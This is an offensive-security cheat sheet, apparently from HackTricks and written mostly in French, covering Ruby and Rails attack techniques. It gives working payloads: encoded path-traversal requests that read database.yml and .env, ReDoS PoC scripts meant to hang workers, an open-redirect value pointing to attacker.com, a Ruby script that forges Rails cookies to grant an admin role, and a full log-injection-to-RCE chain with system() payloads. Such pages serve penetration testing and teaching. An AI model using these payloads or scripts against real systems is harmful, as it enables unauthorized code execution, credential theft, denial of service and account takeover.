# Astuces Ruby

{{#include ../../banners/hacktricks-training.md}}

## Téléversement de fichier vers RCE

Comme expliqué dans [this article](https://www.offsec.com/blog/cve-2024-46986/), téléverser un fichier `.rb` dans des répertoires sensibles tels que `config/initializers/` peut conduire à une exécution de code à distance (RCE) dans les applications Ruby on Rails.

Conseils :
- D'autres emplacements de boot/eager-load exécutés au démarrage de l'application sont également risqués s'ils sont inscriptibles (par ex., `config/initializers/` est l'exemple classique). Si vous trouvez un upload de fichier arbitraire qui atterrit n'importe où sous `config/` et est ensuite évalué/required, vous pouvez obtenir une RCE au démarrage.
- Recherchez des builds dev/staging qui copient des fichiers contrôlés par l'utilisateur dans l'image du conteneur où Rails les chargera au démarrage.

## Active Storage image transformation → command execution (CVE-2025-24293)

Quand une application utilise Active Storage avec `image_processing` + `mini_magick`, et transmet des paramètres non fiables aux méthodes de transformation d'image, les versions de Rails antérieures à 7.1.5.2 / 7.2.2.2 / 8.0.2.1 peuvent permettre une injection de commande car certaines méthodes de transformation étaient par erreur autorisées par défaut.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- À tester pendant les tests
- Identifiez les endpoints qui acceptent des options variant/processing, des noms de transformation, ou des arguments ImageMagick arbitraires.
- Fuzzez `params[:t]` et `params[:v]` pour déceler des erreurs suspectes ou des effets secondaires d'exécution. Si vous pouvez influencer le nom de méthode ou passer des arguments bruts qui atteignent MiniMagick, vous pouvez obtenir une exécution de code sur l'hôte du processeur d'images.
- Si vous n'avez que l'accès en lecture aux variants générés, tentez une exfiltration à l'aveugle via des opérations ImageMagick spécialement conçues.

- Remédiation/détections
- Si vous trouvez une instance de Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 avec Active Storage + `image_processing` + `mini_magick` et des transformations contrôlées par l'utilisateur, considérez-la comme exploitable. Recommandez la mise à jour et l'application d'allowlists strictes pour les méthodes/params ainsi qu'une politique ImageMagick renforcée.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Si la stack cible utilise le middleware Rack directement ou via des frameworks, les versions de `rack` antérieures à 2.2.13, 3.0.14 et 3.1.12 permettent une Local File Inclusion via `Rack::Static` lorsque `:root` n'est pas défini/mal configuré. Des traversals encodés dans `PATH_INFO` peuvent exposer des fichiers sous le répertoire de travail du processus ou un root inattendu.

- Cherchez des applications qui montent `Rack::Static` dans `config.ru` ou leur pile de middleware. Essayez des traversals encodés contre des chemins statiques, par exemple:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Ajustez le préfixe pour correspondre à `urls:` configurés. Si l'application répond avec le contenu du fichier, vous avez probablement une LFI vers n'importe quoi sous le `:root` résolu.

- Atténuation : mettez à jour Rack ; assurez-vous que `:root` pointe uniquement vers un répertoire de fichiers publics et est explicitement défini.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` et < `2.2.8.1` mettait un temps super-linéaire à parser des en-têtes `Content-Type: multipart/form-data` spécialement conçus. Un seul POST avec une très longue liste de paramètres `A=` peut bloquer un worker Puma/Unicorn et provoquer un DoS ou l'épuisement de la file de requêtes.

- Quick PoC (will hang one worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Fonctionne contre toute stack basée sur Rack (Rails/Sinatra/Hanami/Grape). Si elle est frontée par nginx/haproxy avec keep-alive, répétez en parallèle pour épuiser les workers.
- Corrigé en rendant le parseur linéaire ; recherchez une version du gem `rack` < `3.0.9.1` ou < `2.2.8.1`. Dans les évaluations, signalez que les WAF bloquent rarement cela car l'en-tête est syntaxiquement valide.

## REXML XML parser ReDoS (CVE-2024-49761)

Le gem REXML < 3.3.9 (Ruby 3.1 et antérieur) effectue un backtracking catastrophique lors du parsing de références numériques hexadécimales contenant de longues séquences de chiffres (par ex., `&#1111111111111x41;`). Tout XML traité par REXML ou des librairies qui l'encapsulent (clients SOAP/XML API, SAML, uploads SVG) peut être abusé pour épuiser le CPU.

Déclencheur minimal contre un endpoint Rails qui parse du XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Si le processus reste occupé pendant plusieurs secondes et que le CPU des workers augmente, il est probablement vulnérable. L'attaque consomme peu de bande passante et affecte aussi les jobs en arrière-plan qui ingèrent du XML.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Les applications utilisant la gem `cgi` (par défaut dans de nombreuses stacks Rack) peuvent être gelées par un seul en-tête malveillant :
- `CGI::Cookie.parse` avait une complexité super-linéaire ; de longues chaînes de cookie (des milliers de délimiteurs) déclenchent un comportement O(N²).
- L'expression régulière de `CGI::Util#escapeElement` permettait une ReDoS lors de l'échappement HTML.

Les deux problèmes sont corrigés dans `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. Pour les pentests, envoyez un en-tête `Cookie:` massif ou fournissez du HTML non fiable aux helper code et observez le blocage des workers. Combinez avec keep-alive pour amplifier.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

La gem `googlesign_in` < 1.3.0 (utilisée pour Google OAuth sur Rails) effectuait une vérification same-origin incomplète du paramètre `proceedto`. Une URL malformée comme `proceedto=//attacker.com/%2F..` contourne la vérification et redirige l'utilisateur hors du site tout en préservant les cookies flash/session de Rails.

Exploit flow :
1. La victime clique sur un lien Google Sign-In malveillant hébergé par l'attaquant.
2. Après authentification, la gem redirige vers un domaine contrôlé par l'attaquant, leaking flash notices or any data stored in cookies scoped to the wildcard domain.
3. Si l'app stocke des tokens short-lived ou des magic links dans le flash, cela peut être transformé en account takeover.

Lors des tests, grep Gemfile.lock pour `googlesign_in` < 1.3.0 et essayez des valeurs `proceedto` malformées. Confirmez via l'en-tête Location et la réflexion des cookies.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails chiffre et signe les cookies en utilisant des clés dérivées de `secret_key_base`. If that value leaks (e.g., in a repo, logs, or misconfigured credentials), you can usually decrypt, modify, and re-encrypt cookies. Cela mène souvent à un contournement d'authz si l'app stocke des rôles, des user IDs, ou des feature flags dans les cookies.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Remarques :
- Les applications plus anciennes peuvent utiliser AES-256-CBC et des salts `encrypted cookie` / `signed encrypted cookie`, ou des serializers JSON/Marshal. Ajustez les salts, le cipher et le serializer en conséquence.
- En cas de compromission ou lors d'une évaluation, changez `secret_key_base` pour invalider tous les cookies existants.

## Voir aussi (vulnérabilités spécifiques à Ruby/Rails)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

When an app (often a simple Rack/Sinatra/Rails endpoint) both:
- logs a user-controlled string verbatim, and
- later `load`s a file whose path is derived from that same string (after `Pathname#cleanpath`),

You can often achieve RCE by poisoning the log and then coercing the app to `load` the log file. Primitives clés :

- Ruby `load` évalue le contenu du fichier cible comme du Ruby indépendamment de l'extension du fichier. Tout fichier texte lisible dont le contenu se parse en Ruby sera exécuté.
- `Pathname#cleanpath` collapse les segments `.` et `..` sans interroger le système de fichiers, enabling path smuggling : des données contrôlées par l'attaquant peuvent être préfixées pour le logging tandis que le chemin nettoyé résout toujours le fichier visé à exécuter (par ex., `../logs/error.log`).

### Schéma minimal vulnérable
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Pourquoi le log peut contenir du Ruby valide
`Logger` écrit des lignes de préfixe comme :
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
En Ruby, `#` commence un commentaire et `9/2/2025` n'est que de l'arithmétique. Pour injecter du code Ruby valide, vous devez :
- Commencez votre payload sur une nouvelle ligne pour qu'il ne soit pas commenté par le `#` dans la ligne INFO ; envoyez un saut de ligne initial (`\n` ou `%0A`).
- Fermez le `[` en suspens introduit par la ligne INFO. Une astuce courante est de commencer par `]` et, optionnellement, satisfaire le parser avec `][0]=1`.
- Ensuite placez du Ruby arbitraire (par ex., `system(...)`).

Exemple de ce qui se retrouvera dans le log après une requête avec un paramètre forgé :
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Faire passer une seule chaîne qui à la fois logge du code et se résout vers le chemin du log
Nous voulons une seule chaîne contrôlée par l'attaquant qui :
- lorsqu'elle est loggée telle quelle, contient notre payload Ruby, et
- lorsqu'elle est passée via `Pathname.new(<input>).cleanpath`, se résout en `../logs/error.log` de sorte que l'appel suivant à `load` exécute le fichier de log nouvellement empoisonné.

`Pathname#cleanpath` ignore les schémas et élimine les segments de traversée, donc l'exemple suivant fonctionne :
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- Le `#` avant `://` fait en sorte que Ruby ignore la partie finale lorsque le log est exécuté, tandis que `cleanpath` réduit toujours le suffixe en `../logs/error.log`.
- Le saut de ligne initial sort de la ligne INFO ; `]` ferme le crochet en suspens ; `][0]=1` satisfait le parseur.

### Exploitation de bout en bout
1. Envoyez ce qui suit comme nom du script de sauvegarde (URL-encode the first newline as `%0A` if needed):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. L'application enregistre votre chaîne brute dans `logs/error.log`.
3. L'application calcule `cleanpath`, qui résout en `../logs/error.log`, et appelle `load` dessus.
4. Ruby exécute le code que vous avez injecté dans le log.

Pour exfiltrer un fichier dans un environnement de type CTF :
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (le premier caractère est un saut de ligne):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Références

- [Annonce de sécurité Rails: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [Avis de sécurité GitHub: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Documentation Ruby Pathname.cleanpath](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Comment fonctionne load en Ruby](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Avis Rack multipart ReDoS advisory (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Avis de sécurité Ruby pour CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
